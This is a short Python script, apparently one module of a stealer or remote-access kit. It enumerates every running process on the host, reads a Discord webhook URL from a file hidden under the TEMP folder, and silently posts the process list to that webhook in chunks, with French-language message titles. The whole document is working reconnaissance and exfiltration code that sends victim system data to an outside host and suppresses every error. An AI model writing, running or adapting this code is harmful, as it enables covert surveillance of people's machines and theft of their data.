import psutil
import requests
import json
import os

webhook_path = os.path.join(os.environ.get('TEMP'), 'config', 'webhook.txt')

def get_webhook():
    try:
        with open(webhook_path, "r") as f:
            return f.read().strip()
    except Exception:
        return None

def get_process_list():
    processes = []
    try:
        for proc in psutil.process_iter(attrs=['pid', 'name']):
            processes.append(f"{proc.info['name']} (PID: {proc.info['pid']})")
    except Exception:
        pass
    return processes

def send_to_discord(processes):
    webhook = get_webhook()
    if not webhook:
        return
    
    chunk_size = 25
    chunks = [processes[i:i + chunk_size] for i in range(0, len(processes), chunk_size)]

    for index, chunk in enumerate(chunks):
        process_text = "\n".join(chunk)

        embed = {
            "title": f"🖥️ Processus en cours (Partie {index + 1})",
            "description": f"Nombre total de processus : {len(processes)}\n\n```{process_text}```",
            "color": 16711680,
        }

        data = {
            "embeds": [embed]
        }

        headers = {"Content-Type": "application/json"}

        try:
            requests.post(webhook, data=json.dumps(data), headers=headers)
        except Exception:
            pass

process_list = get_process_list()
if process_list:
    send_to_discord(process_list)
